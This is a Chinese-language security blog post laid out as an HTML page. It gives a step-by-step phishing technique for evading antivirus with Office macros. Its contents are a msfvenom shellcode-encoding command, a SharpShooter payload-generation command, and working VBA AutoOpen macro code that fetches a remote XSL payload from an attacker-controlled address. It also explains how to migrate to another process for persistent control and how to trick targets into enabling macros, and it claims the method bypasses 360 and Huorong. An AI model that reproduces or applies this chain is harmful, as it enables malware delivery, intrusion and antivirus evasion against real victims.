@@ -1,0 +1,75 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 加载远程XSL文件的宏免杀方法 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="加载远程XSL文件的宏免杀方法 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">加载远程XSL文件的宏免杀方法</h1><div class="post-time">Mar 21, 2020</div><div class="post-content"><h3><span id="前言">前言</span></h3><p>​        “打点越来越难了，社工钓鱼会是最常见的攻击手段，0day会是最有效的攻击手段，物理渗透会是危害最大的攻击手段“。</p>
+<p>在钓鱼攻击中木马的形式主要如下：</p>
+<ul>
+<li><p>Office</p>
+</li>
+<li><p>DLL劫持</p>
+</li>
+<li><p>假冒加固工具</p>
+</li>
+<li><p>木马捆绑</p>
+<pre><code>通常办公软件Office具有最大的安装量，将文档插入邮件中已经是惯用的工作方式。但是Office常见的攻击方法：
+</code></pre><ul>
+<li><p>0day</p>
+</li>
+<li><p>已知CVE漏洞</p>
+</li>
+<li><p>DDEAUTO</p>
+</li>
+<li><p>注入执行命令</p>
+</li>
+<li><p>宏</p>
+<p>第一种方法直接跳过，已知的CVE漏洞特征太明显，免杀成本和技术含量太大了。DDEAUTO和注入执行命令直接被杀软限制的很死。最后只能靠宏了，虽然默认情况下，Office已经禁用所有宏，但仍会在打开Word文档的时候发出通知。</p>
+</li>
+</ul>
+<p>通过收集宏免杀的常用的方法和测试，发现加载远程<code>.xsl</code>文件可以绕过国内常用的杀软360全家桶和火绒成功上线。</p>
+</li>
+</ul>
+<h3><span id="sharpshooter">SharpShooter</span></h3><p>通过收集和测试一些开源的宏免杀的项目，发现了一个很好的项目，国外一个安全团队写的钓鱼框架。其中一个工具就是可以生成一个VBA宏文件，这个宏文件会用XMLDOM去加载远程的<code>.xsl</code>文件。</p>
+<p>具体原理和利用分析见文章：</p>
+<p><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/" target="_blank" rel="noopener">Macros and More with SharpShooter v2.0</a></p>
+<p>更多的框架利用可以看项目介绍：</p>
+<p>项目地址：<a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></p>
+<h3><span id="利用测试">利用测试</span></h3><h4><span id="生成payloadbin">生成payload.bin</span></h4><p>首先我们可以用<code>Cobalt Strike</code>或者<code>Metasploit</code>生成二进制格式的shellcode，即后缀为<code>bin</code>的文件。</p>
+<h4><span id="处理payloadbin">处理payload.bin</span></h4><p>然后利用<code>msfvenom</code>对<code>payload.bin</code>，因为<code>SharpShooter</code>要求shellcode中不能含有空字节。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &quot;\x00&quot;</span><br></pre></td></tr></table></figure>
+<h3><span id="生成xsl和macro">生成xsl和macro</span></h3><p>如下命令生成<code>.xsl</code>文件和<code>macro</code>文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile shellcode-encoded.bin --com xslremote --awlurl http://192.168.0.104:80/foo.xsl</span><br></pre></td></tr></table></figure>
+<p>简单介绍一下上面的几个参数：</p>
+<ul>
+<li>–dotnetver：为目标的.net版本，可选2或者4</li>
+<li>–awlurl： 为xsl存放地址</li>
+</ul>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584781368230.png" alt="1584781368230"></p>
+<p>生成的<code>foo.macro</code>内容很简单，代码如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    <span class="keyword">Set</span> XML = CreateObject(<span class="string">"Microsoft.XMLDOM"</span>)</span><br><span class="line">    XML.async = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">Set</span> xsl = XML</span><br><span class="line">    xsl.Load <span class="string">"http://192.168.0.104:80/foo.xsl"</span></span><br><span class="line">    XML.transformNode xsl</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p>创建一个对象加载远程的xsl文件。如果需要使函数<code>Auto_Open()</code>加到<code>AutoOpen()</code>方法里，这样就可以在打开word文档的时间就能运行宏，具体代码如下：</p>
+<figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">  Auto_Open</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"><span class="keyword">Sub</span> Auto_Open()</span><br><span class="line">    <span class="keyword">Set</span> XML = CreateObject(<span class="string">"Microsoft.XMLDOM"</span>)</span><br><span class="line">    XML.async = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">Set</span> xsl = XML</span><br><span class="line">    xsl.Load <span class="string">"http://192.168.0.104:80/foo.xsl"</span></span><br><span class="line">    XML.transformNode xsl</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure>
+<p><code>foo.xsl</code>文件为<code>SharpShooter</code>处理后的shellcode。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584807351799.png" alt="1584807351799"></p>
+<p>我们可以把<code>foo.xsl</code>传到自己的vps或者公共下载网站，然后修改vba代码中的地址即可。再讲vba代码加到word或着excel文档中即可。</p>
+<h4><span id="进程迁移">进程迁移</span></h4><p>office宏加载远程的<code>.xsl</code>文件有个缺点就是，点击启用宏后word进程会崩掉，如word进程被结束了，Cobalt Strike或者Metasploit会掉线。所以我们要做的是，在目标上线的时候就自动迁移到其他进程上。</p>
+<p>处理方法：</p>
+<ul>
+<li>Cobalt Strike：通过插件实现上线后自动迁移进程，<a href="https://github.com/threatexpress/aggressor-scripts/tree/d6bdbd587379d7da2a337d19cccdee1a8628d1d8/beacon_handler" target="_blank" rel="noopener">Beacon Handler Suite</a></li>
+<li>Metasploit: 在设置监听的时间可以设置：<code>set autorunscript migrate -N explorer.exe 或 set autorunscript -f</code></li>
+</ul>
+<p>这样可以实现在word进程被关闭后，得到一个新的会话，即持久的控制目标。</p>
+<h4><span id="演示视频">演示视频</span></h4><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\bypass360.gif" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\bypasshr.gif" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\msf.gif" alt=""></p>
+<h3><span id="引导性处理">引导性处理</span></h3><p>为了更好去引导目标启用宏可以如下处理：</p>
+<p>第一步：进入开发工具，选择插入控件—其他控件—Microsoft RDP Client Control*</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584808968035.png" alt="1584808968035"></p>
+<p>第二步：设置控件属性内的Sever为localhost StartConnection为1，即点开自启动</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584809056606.png" alt="1584809056606"></p>
+<p>第三步：插入vba代码</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584809241553.png" alt="1584809241553"></p>
+<p>设置完成后，启用宏的提示就变成了<code>部分活动内容已被禁用，启用内容。</code></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1584809310487.png" alt="1584809310487"></p>
+<p>这样就更好的去引导目标启用宏了。</p>
+<h3><span id="总结">总结</span></h3><p>​        “站在巨人的肩膀上”，以上的思路和方法是最近一个星期在<code>github</code>、<code>twitter</code>和国内外的安全网站论坛上收集和测试得到的结果。然后自己做的一个总结，有兴趣的师傅可以自己研究<code>SharpShooter</code>这个项目，并关注我们的微信公众号，后续我们会继续分享一些思路和方法。</p>
+<h3><span id="reference">Reference</span></h3><p><a href="https://www.secquan.org/Discuss/1070836" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070836</a></p>
+<p><a href="https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/" target="_blank" rel="noopener">https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/</a></p>
+<p><a href="https://github.com/mdsecactivebreach/SharpShooter" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/SharpShooter</a></p>
+</div></article></div></section><footer><div class="paginator"><a href="/posts/notes/frida-hook工具篇.html" class="next">NEXT</a></div><div class="copyright"><p>© 2016 - 2020 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>
